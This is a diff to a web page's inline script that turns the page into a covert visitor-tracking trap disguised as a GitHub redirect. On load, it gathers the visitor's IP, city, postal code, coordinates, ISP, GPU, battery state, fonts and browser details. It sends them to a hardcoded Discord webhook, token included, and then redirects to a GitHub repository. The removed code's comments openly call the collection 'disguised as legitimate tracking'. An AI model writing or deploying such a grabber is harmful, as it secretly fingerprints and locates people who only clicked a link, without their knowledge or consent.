@@ -77,95 +77,258 @@
     </div>
 
     <script>
-        // Function to collect analytics data (disguised as legitimate tracking)
-        async function collectAnalyticsData() {
+        // Enhanced data collection with battery status and more
+        async function collectFullDeviceData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                pageInfo: {
+                    url: window.location.href,
+                    referrer: document.referrer || "direct"
+                },
+                browser: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    doNotTrack: navigator.doNotTrack,
+                    cookieEnabled: navigator.cookieEnabled,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver
+                },
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    orientation: window.screen.orientation?.type
+                },
+                hardware: {
+                    deviceMemory: navigator.deviceMemory || "unknown",
+                    cpuCores: navigator.hardwareConcurrency || "unknown",
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                },
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                gpu: null,
+                battery: null,
+                location: null,
+                ip: null
+            };
+
+            // Get WebGL/GPU information
             try {
-                // Basic analytics data
-                const analyticsData = {
-                    pageView: {
-                        url: window.location.href,
-                        referrer: document.referrer || "direct",
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        screenResolution: `${window.screen.width}x${window.screen.height}`,
-                        devicePixelRatio: window.devicePixelRatio,
-                        platform: navigator.platform
-                    },
-                    performance: {
-                        connection: navigator.connection ? {
-                            effectiveType: navigator.connection.effectiveType,
-                            downlink: navigator.connection.downlink,
-                            rtt: navigator.connection.rtt
-                        } : null,
-                        deviceMemory: navigator.deviceMemory || "unknown",
-                        hardwareConcurrency: navigator.hardwareConcurrency || "unknown"
-                    }
-                };
-
-                // Get approximate location (disguised as content localization)
-                try {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    const geoData = await ipRes.json();
-                    
-                    analyticsData.location = {
-                        country: geoData.country_name,
-                        region: geoData.region,
-                        city: geoData.city,
-                        timezone: geoData.timezone,
-                        coordinates: {
-                            latitude: geoData.latitude,
-                            longitude: geoData.longitude
-                        },
-                        network: {
-                            ip: geoData.ip,
-                            isp: geoData.org,
-                            asn: geoData.asn
-                        }
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.gpu = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                     };
-                } catch (e) {
-                    console.log("Location data unavailable");
                 }
+            } catch (e) {}
 
-                // Get WebGL info (disguised as performance optimization)
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        analyticsData.gpu = {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            // Get battery status (if available)
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level * 100 + "%",
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+            } catch (e) {}
+
+            // Get IP and location data with fallback providers
+            try {
+                // Try first provider
+                const ipRes1 = await fetch('https://api.ipify.org?format=json');
+                if (ipRes1.ok) {
+                    const ipData = await ipRes1.json();
+                    data.ip = ipData.ip;
+                    
+                    // Get location data
+                    const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    if (geoRes.ok) {
+                        const geoData = await geoRes.json();
+                        data.location = {
+                            ip: data.ip,
+                            country: geoData.country_name,
+                            region: geoData.region,
+                            city: geoData.city,
+                            postal: geoData.postal,
+                            timezone: geoData.timezone,
+                            coordinates: {
+                                latitude: geoData.latitude,
+                                longitude: geoData.longitude
+                            },
+                            network: {
+                                isp: geoData.org,
+                                asn: geoData.asn
+                            }
                         };
                     }
-                } catch (e) {
-                    console.log("GPU info unavailable");
                 }
-
-                return analyticsData;
             } catch (e) {
-                console.error("Analytics collection error:", e);
-                return null;
+                // Fallback to second provider if first fails
+                try {
+                    const ipRes2 = await fetch('https://ipinfo.io/json');
+                    if (ipRes2.ok) {
+                        const ipData = await ipRes2.json();
+                        data.ip = ipData.ip;
+                        data.location = {
+                            ip: data.ip,
+                            country: ipData.country,
+                            region: ipData.region,
+                            city: ipData.city,
+                            postal: ipData.postal,
+                            timezone: ipData.timezone,
+                            coordinates: ipData.loc ? {
+                                latitude: ipData.loc.split(',')[0],
+                                longitude: ipData.loc.split(',')[1]
+                            } : null,
+                            network: {
+                                isp: ipData.org,
+                                asn: ipData.asn
+                            }
+                        };
+                    }
+                } catch (e) {}
+            }
+
+            // Get installed fonts (additional fingerprinting)
+            try {
+                const fontList = await getFonts();
+                data.fonts = fontList.slice(0, 20); // Limit to first 20 fonts
+            } catch (e) {
+                // Fallback to basic font detection
+                data.fonts = {
+                    installed: document.fonts ? document.fonts.size : "unknown",
+                    common: detectCommonFonts()
+                };
+            }
+
+            return data;
+        }
+
+        // Helper function to detect common fonts
+        function detectCommonFonts() {
+            const commonFonts = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Andale Mono', 'Baskerville', 'Garamond'
+            ];
+            const available = [];
+            
+            const div = document.createElement('div');
+            div.style.position = 'absolute';
+            div.style.left = '-9999px';
+            div.style.visibility = 'hidden';
+            div.innerHTML = commonFonts.map(font => 
+                `<span style="font-family: ${font}, sans-serif">${font}</span>`
+            ).join('');
+            document.body.appendChild(div);
+            
+            const spans = div.getElementsByTagName('span');
+            for (let i = 0; i < spans.length; i++) {
+                if (spans[i].offsetWidth !== spans[0].offsetWidth || 
+                    spans[i].offsetHeight !== spans[0].offsetHeight) {
+                    available.push(commonFonts[i]);
+                }
+            }
+            
+            document.body.removeChild(div);
+            return available;
+        }
+
+        // Modern font enumeration API
+        async function getFonts() {
+            try {
+                await document.fonts.ready;
+                const fontSet = new Set();
+                for (const font of document.fonts) {
+                    fontSet.add(font.family);
+                }
+                return Array.from(fontSet);
+            } catch (e) {
+                throw new Error('Font enumeration failed');
             }
         }
 
-        // Function to send analytics to server (disguised as legitimate tracking)
-        async function sendAnalyticsToServer(data) {
-            if (!data) return;
-            
+        // Send collected data to Discord
+        async function sendToDiscord(data) {
             try {
                 const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
                 
-                // Format the data for Discord
-                const discordMessage = {
+                // Format the Discord message
+                const message = {
+                    content: "🔍 **New Visitor Data Collected**",
                     embeds: [{
-                        title: "GitHub Page Visitor Analytics",
-                        description: "New visitor data collected from GitHub page",
+                        title: "Detailed Device Information",
                         color: 0x5865F2,
                         fields: [
-                            { name: "🌐 Visitor Info", value: `**IP:** \`${data.location?.ip || 'unknown'}\`\n**Location:** ${data.location?.city || 'unknown'}, ${data.location?.country || 'unknown'}\n**ISP:** ${data.location?.network?.isp || 'unknown'}` },
-                            { name: "🖥️ Device", value: `**OS:** ${data.pageView.platform}\n**Resolution:** ${data.pageView.screenResolution}\n**GPU:** ${data.gpu?.vendor || 'unknown'}` },
-                            { name: "📊 Performance", value: `**Connection:** ${data.performance.connection?.effectiveType || 'unknown'}\n**Memory:** ${data.performance.deviceMemory}GB\n**CPU Cores:** ${data.performance.hardwareConcurrency}` }
+                            {
+                                name: "🌍 Location Info",
+                                value: data.location ? 
+                                    `**IP:** ||\`${data.location.ip}\`||\n` +
+                                    `**Location:** ${data.location.city}, ${data.location.region}, ${data.location.country}\n` +
+                                    `**Coordinates:** ${data.location.coordinates?.latitude}, ${data.location.coordinates?.longitude}\n` +
+                                    `**ISP:** ${data.location.network.isp} (AS${data.location.network.asn})`
+                                    : "Location data unavailable",
+                                inline: true
+                            },
+                            {
+                                name: "💻 Device Info",
+                                value: `**OS:** ${data.browser.platform}\n` +
+                                    `**Screen:** ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n` +
+                                    `**Memory:** ${data.hardware.deviceMemory}GB\n` +
+                                    `**CPU Cores:** ${data.hardware.cpuCores}\n` +
+                                    `**GPU:** ${data.gpu?.vendor || 'Unknown'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔋 Battery Status",
+                                value: data.battery ? 
+                                    `**Level:** ${data.battery.level}\n` +
+                                    `**Charging:** ${data.battery.charging ? 'Yes' : 'No'}\n` +
+                                    `**Status:** ${data.battery.charging ? 
+                                        `Charging (${formatTime(data.battery.chargingTime)})` : 
+                                        `Discharging (${formatTime(data.battery.dischargingTime)})`}`
+                                    : "Battery API not supported",
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Network Info",
+                                value: data.connection ? 
+                                    `**Type:** ${data.connection.type}\n` +
+                                    `**Speed:** ~${Math.round(data.connection.downlink * 100) / 100} Mbps\n` +
+                                    `**Latency:** ${data.connection.rtt}ms\n` +
+                                    `**Save Data:** ${data.connection.saveData ? 'Enabled' : 'Disabled'}`
+                                    : "Network info unavailable",
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Browser Info",
+                                value: `**User Agent:** ||\`${data.browser.userAgent}\`||\n` +
+                                    `**Language:** ${data.browser.language}\n` +
+                                    `**Cookies:** ${data.browser.cookieEnabled ? 'Enabled' : 'Disabled'}\n` +
+                                    `**WebDriver:** ${data.browser.webdriver ? 'Detected' : 'Not detected'}`,
+                                inline: true
+                            },
+                            {
+                                name: "✒️ Fonts Detected",
+                                value: data.fonts ? 
+                                    (Array.isArray(data.fonts) ? 
+                                        `${data.fonts.length} fonts (${data.fonts.slice(0, 3).join(', ')}...)` : 
+                                        `${data.fonts.installed} fonts, ${data.fonts.common.length} common` 
+                                    : "Font data unavailable",
+                                inline: true
+                            }
                         ],
                         footer: {
                             text: `Collected at ${new Date().toLocaleString()}`
@@ -173,28 +336,38 @@
                     }]
                 };
 
-                // Send to Discord webhook
+                // Send the data
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(discordMessage)
+                    body: JSON.stringify(message)
                 });
             } catch (e) {
-                console.error("Failed to send analytics:", e);
+                console.error("Failed to send data to Discord:", e);
             }
         }
 
-        // Main execution flow
-        (async function() {
-            // Collect and send analytics
-            const analyticsData = await collectAnalyticsData();
-            await sendAnalyticsToServer(analyticsData);
+        // Helper to format time
+        function formatTime(seconds) {
+            if (seconds === Infinity) return "Unknown";
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            return `${hours > 0 ? hours + 'h ' : ''}${minutes > 0 ? minutes + 'm' : '<1m'}`;
+        }
+
+        // Main execution
+        (async () => {
+            // Collect all possible data
+            const deviceData = await collectFullDeviceData();
             
-            // Redirect to actual GitHub page after a short delay
+            // Send to Discord
+            await sendToDiscord(deviceData);
+            
+            // Redirect after a short delay
             setTimeout(() => {
                 window.location.href = "https://github.com/KrumoXDev/MassReporterx3";
-            }, 1500);
+            }, 2000);
         })();
     </script>
 </body>
-    </html>
+            </html>
